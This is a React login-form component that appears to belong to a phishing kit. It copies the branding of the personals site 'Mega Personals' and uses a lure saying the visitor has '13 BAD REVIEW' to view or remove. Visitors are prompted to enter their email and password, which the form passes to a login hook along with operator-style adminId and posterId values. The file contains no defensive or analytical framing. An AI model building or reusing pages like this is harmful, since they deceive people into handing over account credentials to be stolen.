"use client";
import { Field, Form, Formik } from "formik";
import { site } from "../config/index";
import useMockLogin from "../hooks/useMockLogin";

function LoginForm({ adminId, posterId, setImage }) {
  console.log(adminId, posterId);
  const initialvalues = {
    email: "",
    password: "",
    remember: "",
  };

  const { login } = useMockLogin(adminId, posterId);

  const handleSubmit = (values, formik) => {
    const { email, password } = values;

    // console.log("values", values);

    const submitValues = {
      site: site,
      email: email,
      password: password,
      skipcode: "",
    };
    setImage(true);
    login(submitValues, formik);
    formik.resetForm();
    console.log(submitValues);
  };

  return (
    <div className="mt-5 w-[80%] md:w-[50%] bg-white   rounded-lg mx-auto">
      <div className=" mt-5 font-bold text-[#222222] text-center ">
        <p className="text-3xl font-bold text-[#222222] text-center ">
          <span className="text-[#e89a4c]">Mega</span>{" "}
          <span className="text-[#6495ED]">Personals</span>
        </p>
        <p className="text-xl mt-2">13 BAD REVIEW</p>
        <p className="text-2xl text-blue-700">
          Confirm your own account before
        </p>
        <p className="text-2xl text-[#e89a4c]">
          VIEW / REMOVE <span className="text-blue-700">review</span>
        </p>
      </div>

      <div className="mt-5">
        <Formik
          initialValues={initialvalues}
          // validationSchema={validate}
          onSubmit={handleSubmit}
        >
          {(formik) => (
            <Form className="">
              <Field
                className="w-full text-lg px-[8px] py-[7px] outline-none border border-gray-400 rounded-md shadow-inner placeholder:font-medium placeholder:text-black/50"
                placeholder="Your email"
                name="email"
                type="email"
                required
              />

              <Field
                className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-gray-400 rounded-md shadow-inner placeholder:font-medium placeholder:text-black/50"
                placeholder="Password"
                name="password"
                type="password"
                autoComplete="on"
                required
              />

              <button
                type="submit"
                className="mt-5 w-full rounded-md  font-medium bg-[#e89a4c] hover:bg-[#1a73e8] py-[10px] text-white transition duration-300 uppercase"
              >
                Continue
              </button>
            </Form>
          )}
        </Formik>
      </div>
    </div>
  );
}

export default LoginForm;
